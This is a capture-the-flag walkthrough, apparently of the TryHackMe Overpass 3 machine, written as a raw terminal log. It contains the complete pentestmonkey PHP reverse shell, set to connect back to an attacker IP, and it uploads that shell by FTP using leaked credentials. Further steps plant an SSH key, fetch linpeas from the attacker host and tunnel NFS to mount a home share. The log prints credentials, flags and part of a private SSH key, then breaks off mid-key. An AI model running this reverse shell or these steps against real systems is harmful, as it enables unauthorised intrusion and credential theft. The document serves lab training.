```
Initial foothold
***enumerating ports with rustscan***
port 80 open
Enumerating with gobuster allows to discover a hidden /backups directory. 
gobuster dir --url http://10.10.16.242 --wordlist /usr/share/wordlists/dirb/common.txt
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 236] [--> http://10.10.16.242/backups/]
***found backup.zip***
wget http://10.10.16.242/backups/backup.zip  
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip backup.zip         
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key     

Import the key and decrypt the file:

┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ gpg --import priv.key                                                                                
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ gpg --decrypt-file CustomerDetails.xlsx.gpg 
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
      
Opening the CustomerDetails.xlsx spreadsheet shows the following information:

Customer Name 	Username 	Password 	Credit card number 	CVC
Par. A. Doxx 	paradox 	ShibesAreGreat123 	4111 1111 4555 1142 	432
0day Montgomery 	0day 	OllieIsTheBestDog 	5555 3412 4444 1115 	642
Muir Land 	muirlandoracle 	A11D0gsAreAw3s0me 	5103 2219 1119 9245 	737 

https://products.aspose.app/cells/es/viewer/view?FolderName=a1b2e4ac-7a2f-43a2-abe3-f972bfcfd8e8&FileName=CustomerDetails.xlsx&Uid=ac0b8ea0-6f8d-4bb3-b59a-51d6f9154c82.xlsx
opening with excel online
***FTP***

Connecting as paradox with ShibesAreGreat123 as password against the FTP service works. 

┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.10.16.242         
Connected to 10.10.16.242.
220 (vsFTPd 3.0.3)
Name (10.10.16.242:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||48349|)
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
We have access to the website’s sources, and the directory is writable. Let’s upload a PHP reverse shell: 
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||43515|)
150 Ok to send data.
100% |****************************************|  5489       10.74 MiB/s    00:00 ETA
226 Transfer complete.
5489 bytes sent in 00:00 (10.36 KiB/s)
***shell.php(from github pentestmonkey)***
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.18.1.77';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
***Reverse shell***
Start a listener (nc -nlvp 4444) and browse the shell that has just been uploaded (curl -s http://10.10.16.242/shell.php). We now have a reverse shell: 
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
curl -s http://10.10.16.242/shell.php
connect to [10.18.1.77] from (UNKNOWN) [10.10.16.242] 42262
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:04:27 up 32 min,  0 users,  load average: 0.00, 0.00, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (854): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ curl -s http://10.10.16.242/shell.php
WARNING: Failed to daemonise.  This is quite common and not fatal.
Connection refused (111)
sh-4.4$
Web flag

After failing to find the flag by searching for files owned by the apache user or group, I eventually found the flag by searching for files matching *flag*: 
sh-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.4$ find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
-r--------  1 root root     0 Jul 28 22:05 /proc/kpageflags
-rw-r--r--  1 root root     0 Jul 28 22:05 /proc/sys/kernel/acpi_video_flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/platform/serial8250/tty/ttyS1/flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/platform/serial8250/tty/ttyS2/flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/platform/serial8250/tty/ttyS3/flags
-r--r-----  1 root root  4096 Jul 28 22:05 /sys/devices/pnp0/00:06/tty/ttyS0/flags
-rw-r--r--  1 root root  4096 Jul 28 22:05 /sys/devices/vif-0/net/eth0/flags
-rw-r--r--  1 root root  4096 Jul 28 22:05 /sys/devices/virtual/net/lo/flags
-rw-r--r--  1 root root  4096 Jul 28 22:05 /sys/module/scsi_mod/parameters/default_dev_flags
-rwxr-xr-x. 1 root root  2183 Nov  8  2019 /usr/bin/pflags
-rwsr-xr-x. 1 root root 12704 Apr 14  2020 /usr/sbin/grub2-set-bootflag
-rw-r--r--. 1 root root    38 Nov 17  2020 /usr/share/httpd/web.flag
-rw-r--r--. 1 root root   285 Apr 14  2020 /usr/share/man/man1/grub2-set-bootflag.1.gz
sh-4.4$ cat /usr/share/httpd/web.flag
cat /usr/share/httpd/web.flag
thm{0ae72f7870c3687129f7a824194be09d}
User Flag

Hint: This flag belongs to james 
Lateral move (www-data -> paradox)

There are 2 users listed under the /home folder. Let’s try the password found previously. 
Network File System, o NFS, es un protocolo de nivel de aplicación, según el Modelo OSI. Es utilizado para sistemas de archivos distribuido en un entorno de red de computadoras de área local. Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.
sh-4.4$ su paradox
su paradox
Password: ShibesAreGreat123
python3 -c "import pty;pty.spawn('/bin/bash')"
[paradox@localhost /]$ export TERM=xterm
export TERM=xterm
[paradox@localhost /]$ ^Z
zsh: suspended  sudo nc -lvnp 4444
                                                                                     
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg                      
[1]  + continued  sudo nc -lvnp 4444
                                    reset
reset
[paradox@localhost /]$ stty columns 190 rows 45
stty columns 190 rows 45
[paradox@localhost /]$ 

[paradox@localhost httpd]$ cd /home/paradox
cd /home/paradox
[paradox@localhost ~]$ ls -al
ls -al
total 820
drwx------. 4 paradox paradox    239 Jul 28 22:39 .
drwxr-xr-x. 4 root    root        34 Nov  8  2020 ..
-rw-rw-r--. 1 paradox paradox  13353 Nov  8  2020 backup.zip
lrwxrwxrwx. 1 paradox paradox      9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox     18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox    141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox    312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 paradox paradox  10019 Nov  8  2020 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox  10366 Nov  8  2020 CustomerDetails.xlsx.gpg
drwx------. 4 paradox paradox    132 Jul 28 22:40 .gnupg
-rwxrwxr-x  1 paradox paradox 777018 Jul 28 22:39 linpeas.sh
-rw-------. 1 paradox paradox   3522 Nov  8  2020 priv.key
drwx------  2 paradox paradox     47 Nov 18  2020 .ssh
-rw-------  1 paradox paradox 782173 Jul 28 22:32 typescript
[paradox@localhost ~]$ cd .ssh/
cd .ssh/
[paradox@localhost .ssh]$ ls -al
ls -al
total 8
drwx------  2 paradox paradox  47 Nov 18  2020 .
drwx------. 4 paradox paradox 239 Jul 28 22:39 ..
-rw-------  1 paradox paradox 563 Jul 28 22:47 authorized_keys
-rw-r--r--  1 paradox paradox 583 Nov 18  2020 id_rsa.pub
[paradox@localhost .ssh]$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZqIJtMmojw6OnbZhyJdTWR2tTX81YQER2ziNCxh6JjirMUbBsjw0tj/P3KB322qnU/bfOWj0hXPywvr6bIkkJNKMOx88KNBaduxqZzlgQulwDf1GpLB/b7cfvaMXu9wnWFE3A35mhVBbi3bI3I4TZMeFwppslsIH2bsLZn2zSnOURZzM/t1X0rdIdm8wpkFfv27x/SqumDuO+TX3bYLBTXrdDeO694TsHPLlrdy+m4NZy91XeXFjX9kSPnxDsi2P1ilJeuekSVPVVU4lATMpnvNGnjRrt4951idKzTi5toTDcytbNSpSNEPs3v2gBjkeLwJCEv/M9BD2MyVMW1qSo+O0/+aSH23CSp0cyRz8NuuA4y6AvlMOz//N4uNo8MibZ6MIuwZQ2wYT0/ZUwSEnGzgv7noFC7PNpU6dMvBT/LzvNXa7TuruS4NKzdYwMAH68bScyV189Dl5ifMhbr5ajNwodk89AsOToL+dI2Bu66wbwxN4Usq9zgqZXhvOiP2c=' >> authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZqIJtMmojw6OnbZhyJdTWR2tTX81YQER2ziNCxh6fvaMXu9wnWFE3A35mhVBbi3bI3I4TZMeFwppslsIH2bsLZn2zSnOURZzM/t1X0rdIdm8wpkFfv27x/SqumDuO+TX3bYLBTXrdDeO694TsHPLlrdy+m4NZy91XeXFjX9kSPnxDsi2P1ilJeuekSVPVVU4lATMpnvNGnjRrt4951EPs3v2gBjkeLwJCEv/M9BD2MyVMW1qSo+O0/+aSH23CSp0cyRz8NuuA4y6AvlMOz//N4uNo8MibZ6MIuwZQ2wYT0/ZUwSEnGzgv7noFC7PNpU6dMvBT/LzvNXa7TuruS4NKzdYwMAH68bScyV189Dl5ifMhbr5ajNwodk89AsO9zgqZXhvOiP2c=' >> auized_keys
[paradox@localhost .ssh]$ ls
ls
auized_keys  authorized_keys  id_rsa.pub
[paradox@localhost .ssh]$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZqIJtMmojw6OnbZhyJdTWR2tTX81YQER2ziNCxh6JjirMUbBsjw0tj/P3KB322qnU/bfOWj0hXPywvr6bIkkJNKMOx88KNBaduxqZzlgQulwDf1GpLB/b7cfvaMXu9wnWFE3A35mhVBbi3bI3I4TZMeFwppslsIH2bsLZn2zSnOURZzM/t1X0rdIdm8wpkFfv27x/SqumDuO+TX3bYLBTXrdDeO694TsHPLlrdy+m4NZy91XeXFjX9kSPnxDsi2P1ilJeuekSVPVVU4lATMpnvNGnjRrt4951idKzTi5toTDcytbNSpSNEPs3v2gBjkeLwJCEv/M9BD2MyVMW1qSo+O0/+aSH23CSp0cyRz8NuuA4y6AvlMOz//N4uNo8MibZ6MIuwZQ2wYT0/ZUwSEnGzgv7noFC7PNpU6dMvBT/LzvNXa7TuruS4NKzdYwMAH68bScyV189Dl5ifMhbr5ajNwodk89AsOToL+dI2Bu66wbwxN4Usq9zgqZXhvOiP2c=' > authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZqIJtMmojw6OnbZhyJdTWR2tTX81YQER2ziNCxh6fvaMXu9wnWFE3A35mhVBbi3bI3I4TZMeFwppslsIH2bsLZn2zSnOURZzM/t1X0rdIdm8wpkFfv27x/SqumDuO+TX3bYLBTXrdDeO694TsHPLlrdy+m4NZy91XeXFjX9kSPnxDsi2P1ilJeuekSVPVVU4lATMpnvNGnjRrt4951EPs3v2gBjkeLwJCEv/M9BD2MyVMW1qSo+O0/+aSH23CSp0cyRz8NuuA4y6AvlMOz//N4uNo8MibZ6MIuwZQ2wYT0/ZUwSEnGzgv7noFC7PNpU6dMvBT/LzvNXa7TuruS4NKzdYwMAH68bScyV189Dl5ifMhbr5ajNwodk89AsO9zgqZXhvOiP2c=' > authorized_keys
[paradox@localhost .ssh]$ ls
ls
auized_keys  authorized_keys  id_rsa.pub
[paradox@localhost .ssh]$ rm auized_keys
rm auized_keys
[paradox@localhost .ssh]$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZqIJtMmojw6OnbZhyJdTWR2tTX81YQER2ziNCxh6JjirMUbBsjw0tj/P3KB322qnU/bfOWj0hXPywvr6bIkkJNKMOx88KNBaduxqZzlgQulwDf1GpLB/b7cfvaMXu9wnWFE3A35mhVBbi3bI3I4TZMeFwppslsIH2bsLZn2zSnOURZzM/t1X0rdIdm8wpkFfv27x/SqumDuO+TX3bYLBTXrdDeO694TsHPLlrdy+m4NZy91XeXFjX9kSPnxDsi2P1ilJeuekSVPVVU4lATMpnvNGnjRrt4951idKzTi5toTDcytbNSpSNEPs3v2gBjkeLwJCEv/M9BD2MyVMW1qSo+O0/+aSH23CSp0cyRz8NuuA4y6AvlMOz//N4uNo8MibZ6MIuwZQ2wYT0/ZUwSEnGzgv7noFC7PNpU6dMvBT/LzvNXa7TuruS4NKzdYwMAH68bScyV189Dl5ifMhbr5ajNwodk89AsOToL+dI2Bu66wbwxN4Usq9zgqZXhvOiP2c=
[paradox@localhost .ssh]$ 
found in root kali .ssh authorized_keys
***pass linpeas.sh***
sudo -m http.server 80
[paradox@localhost .ssh]$ cd /tmp
cd /tmp
[paradox@localhost tmp]$ wget http://10.18.1.77/linpeas.sh
wget http://10.18.1.77/linpeas.sh
bash: wget: command not found
[paradox@localhost tmp]$ curl http://10.18.1.77/linpeas.sh
curl http://10.18.1.77/linpeas.sh
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
[paradox@localhost tmp]$ curl http://10.18.1.77/linpeas.sh -o linpeas.sh
curl http://10.18.1.77/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   469  100   469    0     0   1178      0 --:--:-- --:--:-- --:--:--  1175
[paradox@localhost tmp]$ ls
ls
linpeas.sh
[paradox@localhost tmp]$ 

[paradox@localhost tmp]$ curl http://10.18.1.77/linpeas.sh -o linpeas.sh
curl http://10.18.1.77/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  758k  100  758k    0     0   258k      0  0:00:02  0:00:02 --:--:--  258k
[paradox@localhost tmp]$ ls
ls
linpeas.sh
[paradox@localhost tmp]$ sh linpeas.sh | more
sh linpeas.sh | more

┌──(kali㉿kali)-[~/Downloads]
└─$ ls
1.tar                     hash                          robert_ssh.txt
46635.py                  hashes.txt                    SAM
backdoors                 hash.txt                      shadow.txt
backup.zip                id_rsa_robert                 SharpGPOAbuse
buildscript.sh            key                           SharpGPOAbuse.exe
Chankro                   KIBA                          shell.php
cracking.txt              Lian_Yu                       socat
credential.pgp            linpeas.sh                    solar_log4j
CustomerDetails.xlsx      Market_Place                  startup.bat
CustomerDetails.xlsx.gpg  NAX                           SYSTEM
Devservice.exe            overpass2.pcapng              system.txt
download.dat              overpass.go                   tryhackme.asc
download.dat2             priv.key                      Windows_priv
downloads                 PurgeIrrelevantData_1826.ps1  Witty
exploit_commerce.py       responder_ntlm_hash           WittyAle.ovpn
Ghostcat-CNVD-2020-10487  reverse.exe
Git_Happens               reverse.msi
                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.242 - - [28/Jul/2022 18:32:46] "GET /linpeas.sh HTTP/1.1" 200 -

[paradox@localhost tmp]$ rpcinfo -p
rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100024    1   udp  52386  status
    100024    1   tcp  51925  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  36454  nlockmgr
    100021    3   udp  36454  nlockmgr
    100021    4   udp  36454  nlockmgr
    100021    1   tcp  42215  nlockmgr
    100021    3   tcp  42215  nlockmgr
    100021    4   tcp  42215  nlockmgr
[paradox@localhost tmp]$ 

┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -L 2049:localhost:2049 paradox@10.10.16.242
The authenticity of host '10.10.16.242 (10.10.16.242)' can't be established.
ED25519 key fingerprint is SHA256:18WMJxDadr79jI/eHKaMMLgRKWSOMUxtNLFbBJjVKrg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.16.242' (ED25519) to the list of known hosts.
Enter passphrase for key '/home/kali/.ssh/id_rsa': witty
Last login: Thu Jul 28 23:40:36 2022
[paradox@localhost ~]$ 

┌──(kali㉿kali)-[~]
└─$ netstat -tplan
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:2049          0.0.0.0:*               LISTEN      13441/ssh           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.13.129:41352    172.67.27.10:443        ESTABLISHED 1324/firefox-esr    
tcp        0      0 192.168.13.129:41350    172.67.27.10:443        ESTABLISHED 1324/firefox-esr    
tcp        0      0 192.168.13.129:41348    172.67.27.10:443        ESTABLISHED 1324/firefox-esr    
tcp        0      0 192.168.13.129:55182    35.80.180.169:443       ESTABLISHED 1324/firefox-esr    
tcp        0      0 10.18.1.77:4444         10.10.16.242:42308      ESTABLISHED -                   
tcp        0      0 10.18.1.77:52792        10.10.16.242:22         ESTABLISHED 13441/ssh           
tcp        0      0 192.168.13.129:49588    142.250.0.190:443       ESTABLISHED 1324/firefox-esr    
tcp6       0      0 ::1:2049                :::*                    LISTEN      13441/ssh           

──(kali㉿kali)-[~/Downloads]
└─$ ls
1.tar                     hash                          robert_ssh.txt
46635.py                  hashes.txt                    SAM
backdoors                 hash.txt                      shadow.txt
backup.zip                id_rsa_robert                 SharpGPOAbuse
buildscript.sh            key                           SharpGPOAbuse.exe
Chankro                   KIBA                          shell.php
cracking.txt              Lian_Yu                       socat
credential.pgp            linpeas.sh                    solar_log4j
CustomerDetails.xlsx      Market_Place                  startup.bat
CustomerDetails.xlsx.gpg  NAX                           SYSTEM
Devservice.exe            overpass2.pcapng              system.txt
download.dat              overpass.go                   tryhackme.asc
download.dat2             priv.key                      Windows_priv
downloads                 PurgeIrrelevantData_1826.ps1  Witty
exploit_commerce.py       responder_ntlm_hash           WittyAle.ovpn
Ghostcat-CNVD-2020-10487  reverse.exe
Git_Happens               reverse.msi
                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir ./james          
                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ mount -t nfs localhost:/ ./james
mount.nfs: failed to apply fstab options

                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo su           
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali/Downloads]
└─# mount -t nfs localhost:/ ./james
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cd james        
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james]
└─# ls -al
total 20
drwx------  3 kali kali  112 Nov 17  2020 .
drwxr-xr-x 16 kali kali 4096 Jul 28 18:49 ..
lrwxrwxrwx  1 root root    9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 kali kali   18 Nov  8  2019 .bash_logout
-rw-r--r--  1 kali kali  141 Nov  8  2019 .bash_profile
-rw-r--r--  1 kali kali  312 Nov  8  2019 .bashrc
drwx------  2 kali kali   61 Nov  7  2020 .ssh
-rw-------  1 kali kali   38 Nov 17  2020 user.flag
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james]
└─# cat user.flag      
thm{3693fc86661faa21f16ac9508a43e1ae}

┌──(root㉿kali)-[/home/kali/Downloads/james]
└─# cd .ssh 
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james/.ssh]
└─# ls -al
total 12
drwx------ 2 kali kali   61 Nov  7  2020 .
drwx------ 3 kali kali  112 Nov 17  2020 ..
-rw------- 1 kali kali  581 Nov  7  2020 authorized_keys
-rw------- 1 kali kali 2610 Nov  7  2020 id_rsa
-rw-r--r-- 1 kali kali  581 Nov  7  2020 id_rsa.pub
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james/.ssh]
└─# cat id_rsa        
-----BEGIN OPENSSH PRIVATE KEY-----
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
